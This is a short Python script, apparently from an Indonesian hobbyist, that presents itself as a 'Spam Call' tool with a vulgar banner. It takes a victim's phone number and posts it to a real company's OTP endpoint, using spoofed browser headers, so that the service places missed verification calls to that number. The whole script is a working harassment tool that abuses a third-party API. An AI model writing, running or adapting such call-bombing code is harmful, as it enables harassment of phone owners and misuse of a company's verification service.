import requests as za
import json,os,sys

ngentot = """
        * Spam~Call *
{x} Author   : Reza Gans
{x} Creathor : Reza Alfauzan
{x} Spam Call Ngentot!!!
<<~~~~~~~~~~~~~~~~~~~~~~~~~~>>
"""
os.system('clear')
print(ngentot)

target = input(" Target Call : ")

api_url = "https://www.nutriclub.co.id/otp/?phone=0"+target+"&old_phone=0"+target

headers = {"Host": "www.nutriclub.co.id","content-length": "0","accept": "application/json, text/javascript, */*: q=0.01","x-requested-with":"XMLHttpRequest","save-data": "on","user-agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0","origin": "https://www.nutriclub.co.id","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://www.nutriclub.co.id/account/register"}
respon = za.post(api_url,headers).text
status = json.loads(respon)["StatusMessage"]
if status == "Request miscall berhasil":
        print("\n {✓} Call to : "+ target +" Berhasil \n")
else:
        print("\n {x} Call to : "+ target +" Missed \n")
